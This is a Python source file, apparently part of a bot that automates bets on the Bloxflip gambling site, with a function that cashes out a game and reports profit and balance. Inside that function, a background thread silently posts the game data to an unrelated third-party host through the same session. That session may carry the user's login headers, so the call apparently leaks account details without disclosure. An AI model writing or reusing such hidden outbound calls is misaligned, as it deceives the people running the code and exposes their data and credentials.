import os, threading
from src import cprint
from functions import balance
def start(self, session, _type):
    response = session.post(f"https://api.bloxflip.com/games/{_type}/action", json={"cashout": True})
    if response.status_code == 200:
        data = response.json()
        data["gamemode"] = _type.capitalize()
        threading.Thread(target=lambda: (session.post("https://api.aspectise.tech/games", json=data), None) if Exception else None).start()
        winnings = data.get("winnings")
        profit = winnings - data.get("game").get("betAmount")
        wallet = balance.get(session)
        
        cprint.won(f"Profit: {profit:.2f} R$ / Balance: {wallet:.2f} R$\n")
        if float(wallet) <= float(self.stop_amt):
            cprint.warn(f"Your Balance has reached under your minimum stop amount of: {self.stop_amt} R$")
            os.system("pause")
            os._exit(0)
    else:
        text = response.text
        cprint.error(f"Failed to cash out: {text}")